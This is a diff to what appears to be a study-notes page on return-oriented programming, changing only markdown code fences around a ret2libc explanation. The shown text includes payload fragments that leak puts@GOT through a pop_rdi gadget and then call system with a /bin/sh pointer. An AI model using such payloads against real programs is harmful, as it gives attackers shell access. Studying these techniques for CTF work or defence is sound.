@@ -13,7 +13,6 @@ ROP
         <div>
 
 
-```
 		to use ret2libc we need to know two things
 	
 		1. the exact libc version the ELF uses
@@ -25,7 +24,7 @@ ROP
 
 		since we have the ELF file we can do this with ease as the GOT and PLT sections are known to us (asuming PIE is off)
 
-		```	
+			
 		payload = b''
 		payload += b'A'*0x10			#padding
 		payload += p64(pop_rdi)			#set first arg to the addr of puts@GOT
@@ -72,7 +71,7 @@ ROP
 		payload += p64(pointer_binsh)		#addr of /bin/sh\x00 in mem
 		payload += p64(system)			#call the libc system function
 
-```
+
 </div>
 </details>
 
